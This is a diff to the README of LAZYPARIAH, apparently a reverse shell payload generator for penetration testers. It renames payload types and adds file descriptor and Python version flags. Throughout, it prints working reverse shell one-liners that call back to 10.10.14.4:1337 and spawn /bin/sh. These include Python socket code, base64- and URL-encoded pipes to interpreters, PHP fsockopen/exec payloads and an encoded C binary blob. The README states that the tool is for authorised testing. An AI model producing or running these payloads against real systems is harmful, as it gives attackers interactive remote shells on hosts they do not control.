@@ -8,11 +8,12 @@ LAZYPARIAH is a simple and easily installable command-line tool written in pure 
 
 The reverse shell payloads that LAZYPARIAH supports include (but are not limited to):
 
-* Base64-encoded Python payloads: `python2_b64`, `python3_b64`
-* Java classes (compiled on the fly): `java_class_binary`, `java_class_b64`, `java_class_gzip_b64`
-* Tagged PHP payloads: `php_fd_3_tags`, `php_fd_4_tags`, `php_fd_5_tags`, `php_fd_6_tags`
 * C binary payloads (compiled on the fly): `c_binary`, `c_binary_b64`, `c_binary_gzip`, `c_binary_gzip_b64`, `c_binary_hex`, `c_binary_gzip_hex`
 * Ruby payloads: `ruby`, `ruby_b64`, `ruby_hex`, `ruby_c`
+* Base64-encoded Python payloads: `python_b64`
+* PHP scripts containing base64-encoded Python payloads called via the `system()` function: `php_system_python_b64`
+* Java classes (compiled on the fly): `java_class_binary`, `java_class_b64`, `java_class_gzip_b64`
+* Simple PHP payloads (targeting specific file descriptors): `php_fd`, `php_fd_c`, `php_fd_tags`
 
 ## Warning
 This tool is intended to be used only in authorised circumstances by qualified penetration testers, security researchers and red team professionals. Before downloading, installing or using this tool, ensure that you understand the relevant laws in your jurisdiction. The author of this tool does not endorse, encourage or condone the use of this tool for illegal or unauthorised purposes.
@@ -23,7 +24,7 @@ This tool is intended to be used only in authorised circumstances by qualified p
 * GCC (Optional: Only required for `c_binary` payloads.)
 
 ## Installation
-LAZYPARIAH can be installed as follows:
+LAZYPARIAH can be installed on most Linux systems using the RubyGems installer as follows:
 ```
 gem install lazypariah
 ```
@@ -54,25 +55,12 @@ Valid Payloads:
     perl_b64
     perl_c
     perl_hex
-    php_fd_3
-    php_fd_3_c
-    php_fd_3_tags
-    php_fd_4
-    php_fd_4_c
-    php_fd_4_tags
-    php_fd_5
-    php_fd_5_c
-    php_fd_5_tags
-    php_fd_6
-    php_fd_6_c
-    php_fd_6_tags
+    php_fd
+    php_fd_c
+    php_fd_tags
+    php_system_python_b64
+    php_system_python_hex
     python
-    python2_b64
-    python2_c
-    python2_hex
-    python3_b64
-    python3_c
-    python3_hex
     python_b64
     python_c
     python_hex
@@ -87,6 +75,9 @@ Valid Options:
     -l, --license                    Display license information and exit.
     -u, --url                        URL-encode the payload.
     -v, --version                    Display version information and exit.
+    -D, --fd INTEGER                 Specify the file descriptor used by the target for TCP. Required for certain payloads.
+    -P, --pv INTEGER                 Specify Python version for payload. Must be either 2 or 3. By default, no version is specified.
+    -N, --no-new-line                Do not append a new-line character to the end of the payload.
 ```
 
 ## Further Notes and Examples
@@ -94,9 +85,9 @@ The payloads listed above are more-or-less systematically named.
 
 Payloads ending with `_c` are intended to be executed from within a shell session. These payloads execute code directly using the relevant interpreter (e.g. `python3 -c` or `ruby -e`).
 
-For example, the command `lazypariah python3_c 10.10.14.4 1337` should produce the following output:
+For example, the command `lazypariah python_c 10.10.14.4 1337` should produce the following output:
 ```
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 The command `lazypariah python 10.10.14.4 1337`, on the other hand, should simply produce a block of Python code which could potentially be placed in a `.py` file:
@@ -106,10 +97,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 Generally speaking, selecting payloads ending with `_b64` should produce a command intended to be run from within a shell session in a similar manner to payloads ending with `_c`, but the commands will be different in structure. These commands will essentially pipe a base64-encoded block of code through to `base64 -d` and then on through to the relevant interpreter (such as `python3`, `python2` or `ruby`).
 
-For example, the command `lazypariah python3_b64 10.10.14.4 1337` should produce the following output:
+For example, the command `lazypariah python_b64 10.10.14.4 1337` should produce the following output:
 ```
-echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python3
+echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw== | base64 -d | python
 ```
+
+These types of payloads can be useful in certain situations because they do not include any single or double quotes.
 
 In a similar manner, selecting payloads ending with `_hex` will produce a command that pipes a hexadecimal-encoded block of code through to `xxd -p -r -` and then on through to the relevant interpreter. For example, `lazypariah perl_hex 10.10.14.4 1337` should produce the following output:
 ```
@@ -121,19 +114,25 @@ The exception to this is compiled payloads, such as `c_binary_b64`, `java_class_
 H4sIAGBTu18AA3VTXVcSURTdgzNcoFEUMaU0M7XwC7QsE8xK08LwoyANzVoD3HQUGdfMUPZXfKi1fPG1XrCVq35AP6bVL8jOBUnJGu5sztl3n3vOmTnz/deXbwBG8MqDNvQw9DL0udDvgQMDAkICwgyDLgx54MJ1DzpxQ8CwcEvWTWGV4JYHXRgRcNuDbowKiCgoXxQaxZgIuMMwLv7viph7DPcZJiQ4x/S8bo9LqAn2LEqQJ40sl+CN63k+V9hKczOppXPE1CZsLbM5q22XfIZJhgcMUxI8UzsZvm3rRt4iJ2EUzAyf1kUIM63QhvZGU3EJ7RJahB3Oafm18IJpZLhlTRT0XJabEupPthK2qefXKDic1vNha10ET6t4iEcqYpih0kraPLfDCSOzyW1KOjQYEms4NCzUj1XEMatiTsA8FlQ8wVMVCSRVPBOwiCUVz9HOkFKxjBUVL5CU0HhSxJ+WVKyiXcVLUb/DtKoqnU9v8AylbzjTV+Us3QjH8tsFm3ri2pYEf4WdL9in6PPBlfjfDyAqXkajybO6SUmmTNMwK/K24HJP/H/PMipBsWzNpLqagv+QRUW6s9liIl3dGrer6m2unFDdSLQsrSrKS0R1Vy2ngk/vULRLtyZzhsWzpalbluAmnZ4rDxoxMZpDktK28tbUbSLlYKlC5XWuYK1XvYXk+rHSynG+LZQzQunmO7q9qOUKYg6z3LJN4x2JMiItOtBK3524JPrRcNLXdlk4cMJN7MfeA0iHcKTkr6hJ1fjkxAEUuQhnESx+CFfK525QRg/gme0r4twcgRqR+4uojShk10WcZHsjjLB+F6sDRTS8hzfAyPAV0bh/9DMgl7j6ABNWmfwRUI5Jp7AqJCvCH6DEfj+aPqOZzm9Z2ocr4to/2iPnAiW5+IlK38UH7CFAnXRA9CGVurtC2At2hGm4GFoZOpkwuiqrmxapfX7/EkNAxlXSyxQXoPsa2Q4EfwOw0NwVrQQAAA==
 ```
 
-Some payloads use a specific file descriptor, such as `php_fd_5_tags`, which is a PHP payload that makes use of file descriptor 5 and is enclosed within PHP tags (`<?php` and `?>`).
+Some payloads require the user to specify the file descriptor used by the target for TCP connections. One example of such a payload is `php_fd_tags`, which is a simple PHP payload enclosed within PHP tags (`<?php` and `?>`) that targets a specific file descriptor.
+
+To specify a target file descriptor, the user must use the command line argument `-D INTEGER` or `--fd INTEGER`. For example, to generate a `php_fd_tags` payload that targets file descriptor `5`, the following command can be used:
+`lazypariah -D 5 php_fd_tags 10.10.14.4 1337`
+
+The resulting payload should be as follows:
+`<?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&5 >&5 2>&5");?>`
 
 Below are some examples of commands and their respective outputs.
 
-Output of command `lazypariah -u python3_b64 10.10.14.4 1337`:
+Output of command `lazypariah -P 3 -u python_b64 10.10.14.4 1337`:
 ```
 echo%20aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjQiLDEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOw%3D%3D%20%7C%20base64%20-d%20%7C%20python3
 ```
-Output of command `lazypariah python2_c 10.10.14.4 1337`:
+Output of command `lazypariah -P 2 python_c 10.10.14.4 1337`:
 ```
 python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-Output of command `lazypariah php_fd_3_tags 10.10.14.4 1337`:
+Output of command `lazypariah -D 3 php_fd_tags 10.10.14.4 1337`:
 ```
 <?php $sock=fsockopen("10.10.14.4",1337);exec("/bin/sh -i <&3 >&3 2>&3");?>
 ```
